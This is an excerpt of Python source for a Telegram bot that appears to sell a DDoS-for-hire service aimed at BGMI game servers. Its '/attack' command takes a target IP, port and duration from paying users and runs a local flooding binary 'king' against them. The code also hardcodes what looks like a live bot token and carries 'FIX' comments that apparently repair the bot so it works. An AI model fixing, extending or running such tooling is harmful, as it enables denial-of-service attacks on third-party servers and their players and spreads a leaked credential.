...
bot = telebot.TeleBot('8240569287:AAErQgambca1XH7dvKDp1ADAlBB77NvkfgU')
...
# FIX 1: FREE_USER_FILE was undefined — caused NameError crash
...
# FIX 2: Rewritten duration parser — old code used [-4:] which broke for
# units like "days"(4), "hours"(5), "weeks"(5), "months"(6) etc.
def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    # longest units first so we don't match a prefix
    units = ["months", "month", "weeks", "week", "days", "day", "hours", "hour"]
    for unit in units:
        if duration_str.endswith(unit):
            numeric = duration_str[: -len(unit)]
            if not numeric.isdigit():
                raise ValueError(f"Non-numeric prefix: {numeric!r}")
            value = int(numeric)
            if value <= 0:
                raise ValueError("Duration must be positive")
            return value, unit
    raise ValueError(f"Unknown time unit in: {duration_str!r}")
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        if len(command) > 2:
            ...
            try:
                duration, time_unit = parse_duration(duration_str)
            except ValueError:
...
def show_recent_logs(message):
    ...
    if user_id in admin_id:
        ...
        bot.reply_to(message, "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai.")
    ...
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                bot.reply_to(message, "You Are On Cooldown ❌. Please Wait Before Running The /attack Command Again.")
                return
        ...
        if len(command) == 4:
            ...
            if time > 1000:
                ...
                # FIX 3: resolve binary path relative to script dir (king.dat renamed to king)
                script_dir = os.path.dirname(os.path.abspath(__file__))
                full_command = f"{os.path.join(script_dir, 'king')} {target} {port} {time} 100"
